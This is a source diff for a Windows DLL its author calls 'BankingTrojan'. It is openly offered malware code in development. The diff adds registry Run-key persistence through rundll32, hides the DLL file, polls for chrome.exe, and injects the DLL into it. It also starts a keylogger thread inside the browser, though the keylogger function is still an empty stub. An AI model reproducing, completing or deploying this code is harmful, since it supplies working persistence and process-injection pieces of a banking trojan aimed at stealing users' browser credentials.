@@ -14,10 +14,12 @@
 #include <processthreadsapi.h>
 #include <wchar.h>
 
-const wchar_t* dllPath = L"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll";
+#define DEBUG 1
+
+const wchar_t dllName[] = L"BankingTrojan.dll";
 const wchar_t targetProcessName[] = L"chrome.exe";
 
-
+// Check if the current user is an administrator
 bool isUserAdmin() {	// from MDMZ_Book.pdf
 	bool isElevated = false;
 	HANDLE token;
@@ -37,17 +39,18 @@ bool isUserAdmin() {	// from MDMZ_Book.pdf
 	return isElevated;
 }
 
-bool writeRegedit(const wchar_t* dllPath) {
-    // start command:
-    // rundll32 "C:\dev\BankingTrojan\x64\Debug\BankingTrojan.dll", StartBankTrojan
 
-    const wchar_t* valueName = L"BankingTrojan";
-    const wchar_t* regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-	//const wchar_t* regValue = L"C:\\Windows\\System32\\rundll32.exe \"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll\", StartBankTrojan";
-	std::wstring regLValue = L"C:\\Windows\\System32\\rundll32.exe \"" + std::wstring(dllPath) + L"\", StartBankTrojan";
+bool writeRegedit(const wchar_t* dllPath) {
+	// start command:
+	// rundll32 "C:\dev\BankingTrojan\x64\Debug\BankingTrojan.dll", StartBankingTrojan
+	// rundll32 BankingTrojan.dll, StartBankingTrojan
+	const wchar_t* valueName = L"BankingTrojan";
+	const wchar_t* regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+	//const wchar_t* regValue = L"C:\\Windows\\System32\\rundll32.exe \"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll\", StartBankingTrojan";
+	std::wstring regLValue = L"C:\\Windows\\System32\\rundll32.exe \"" + std::wstring(dllPath) + L"\", StartBankingTrojan";
 	const wchar_t* regValue = regLValue.c_str();
 
-	
+
 	HKEY hKey;
 	LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);
 	if (result != ERROR_SUCCESS)
@@ -66,36 +69,39 @@ bool writeRegedit(const wchar_t* dllPath) {
 	return true;
 }
 
-bool IsProcessRunning(const wchar_t* processName,DWORD *PID=0)
+bool IsProcessRunning(const wchar_t* processName, DWORD* PID = 0)
 {
-    bool exists = false;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE)
-    {
-        PROCESSENTRY32W pe;
-        pe.dwSize = sizeof(PROCESSENTRY32W);
+	bool exists = false;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot != INVALID_HANDLE_VALUE)
+	{
+		PROCESSENTRY32W pe;
+		pe.dwSize = sizeof(PROCESSENTRY32W);
 
-        if (Process32FirstW(hSnapshot, &pe))
-        {
-            do
-            {
-                if (_wcsicmp(pe.szExeFile, processName) == 0)
-                {
-                    exists = true;
-                    *PID = pe.th32ProcessID;
-                    break;
-                }
-            } while (Process32NextW(hSnapshot, &pe));
-        }
-        CloseHandle(hSnapshot);
-    }
-    return exists;
+		if (Process32FirstW(hSnapshot, &pe))
+		{
+			do
+			{
+				if (_wcsicmp(pe.szExeFile, processName) == 0)
+				{
+					exists = true;
+					*PID = pe.th32ProcessID;
+					break;
+				}
+			} while (Process32NextW(hSnapshot, &pe));
+		}
+		CloseHandle(hSnapshot);
+	}
+	return exists;
 }
+
+
 
 bool DLLinject(DWORD pid, const wchar_t* dllPath) {
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (hProcess == NULL)
 	{
+		//CloseHandle(hProcess); //  0
 		return false;
 	}
 
@@ -147,56 +153,93 @@ bool DLLinject(DWORD pid, const wchar_t* dllPath) {
 	return true;
 }
 
-bool TrojanLoader() {
-	// Register key first
-	if (isUserAdmin()) {
-		writeRegedit(dllPath);
-	}
-	else {
-		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
-	}
-    
-
-    // Decrypt target process name
+bool TrojanLoader(const wchar_t* dllPath) {
+	// Decrypt target process name
 	/*
-    wchar_t targetProcessName[] = L"ja{fdl'lql";
-    DWORD pid = 0;
-    for (size_t i = 0; i < wcslen(targetProcessName); i++) {
-        targetProcessName[i] ^= 0x09;
-    }
+	wchar_t targetProcessName[] = L"ja{fdl'lql";
+	DWORD pid = 0;
+	for (size_t i = 0; i < wcslen(targetProcessName); i++) {
+		targetProcessName[i] ^= 0x09;
+	}
 	*/
-    // Wait for the target process to start
-    DWORD targetPID = 0;
-    const DWORD waitInterval = 1000;
-    while (!IsProcessRunning(targetProcessName, &targetPID))
-    {
-        Sleep(waitInterval);
-    }
+	// Wait for the target process to start
+	DWORD targetPID = 0;
+	const DWORD waitInterval = 1000;
+	while (!IsProcessRunning(targetProcessName, &targetPID))
+	{
+		Sleep(waitInterval);
+	}
 
 	// Inject the DLL into the target process
 	DLLinject(targetPID, dllPath);
 	return true;
 }
 
+
+bool getDLLPath(wchar_t* DLLPath) {
+	HMODULE hModule = NULL;
+	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
+	{
+		if (DEBUG && GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
+		{
+			MessageBox(NULL, DLLPath, L"getDLLPath", MB_OK);
+			return true;
+		}
+	}
+	return false;
+}
+
+
+// Do noting
 void debug_hold() {
 	while (true) {
 		Sleep(1000);
 	}
 }
 
-int hideDll(const wchar_t *dllPath) {
+int hideDll(const wchar_t* dllPath) {
 	// I think this is useless XD
-	SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN );
+	SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN);
 	// Inject to explorer.exe
-	//DLLinject(0, dllPath);
 
 	return 0;
 
 }
 
+bool keyloggerMain(wchar_t* DLLPath) {
+	HINSTANCE g_hInstance = NULL;
+	HHOOK g_hHook = NULL;
+	HWND g_hWnd = NULL;
+
+	return 1;
+}
+
+DWORD WINAPI KeyloggerMainThread(LPVOID lpParam)
+{
+	wchar_t DLLPath[MAX_PATH];
+	if (DEBUG&&!getDLLPath(DLLPath)) {
+		MessageBoxW(NULL, L"Fail to get DLL path", L"KeyloggerMainThread", MB_OK);
+		return 0;
+	}
+
+	keyloggerMain(DLLPath);
+	return 0;
+}
+
 int chromeMain() {
 
-	MessageBoxW(NULL, L"ChromeMain", L"BankingTrojan", MB_OK);
+	// New thread for keyloggerMain
+	HANDLE hThread = CreateThread(
+		NULL,
+		0,
+		KeyloggerMainThread,
+		NULL,
+		0,
+		NULL
+	);
+
+
+
 	debug_hold();
 	return 1;
 }
@@ -208,21 +251,36 @@ DWORD WINAPI ChromeMainThread(LPVOID lpParam)
 }
 
 
-extern "C" __declspec(dllexport) void CALLBACK StartBankTrojan(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+// First entry point
+extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
+	wchar_t dllPath[MAX_PATH];
+	if (DEBUG && !getDLLPath(dllPath)) {
+		MessageBoxW(NULL, L"Fail to get DLL path", L"StartBankingTrojan", MB_OK);
+		return;
+	}
+
+	// Register key first
+	if (isUserAdmin()) {
+		writeRegedit(dllPath);
+	}
+	else if(DEBUG){
+		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
+	}
+
 	// hideDll
 	hideDll(dllPath);
-	
-	TrojanLoader();
+
+	TrojanLoader(dllPath);
 
 	ExitProcess(0);
 }
 
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
 {
 
 	HANDLE hProcess = GetCurrentProcess();
@@ -230,8 +288,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	HANDLE hThread = NULL;
 	DWORD threadId = 0;
 
-    switch (ul_reason_for_call)
-    {
+	switch (ul_reason_for_call)
+	{
 	case DLL_PROCESS_ATTACH:
 	{
 		HANDLE hProcess = GetCurrentProcess();
@@ -239,7 +297,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		wchar_t exploreName[] = L"explorer.exe";
 		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
 		{
-			if (_wcsicmp(processName, targetProcessName) == 0) { 
+			if (_wcsicmp(processName, targetProcessName) == 0) {
 				// New thread for chromeMain
 				hThread = CreateThread(
 					NULL,
@@ -254,17 +312,18 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 					// fail to create thread
 				}
 			}
-			else if (_wcsicmp(processName, exploreName)==0)
+			else if (_wcsicmp(processName, exploreName) == 0)
 			{
 				// todo
 			}
 		}
 	}
+
 	break;
-    case DLL_THREAD_ATTACH:
-        break;
-    case DLL_THREAD_DETACH:
-        break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
 	case DLL_PROCESS_DETACH:
 	{
 		if (hThread != NULL) {
@@ -275,7 +334,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		}
 	}
 	break;
-    }
-    return TRUE;
+	}
+	return TRUE;
 }
 
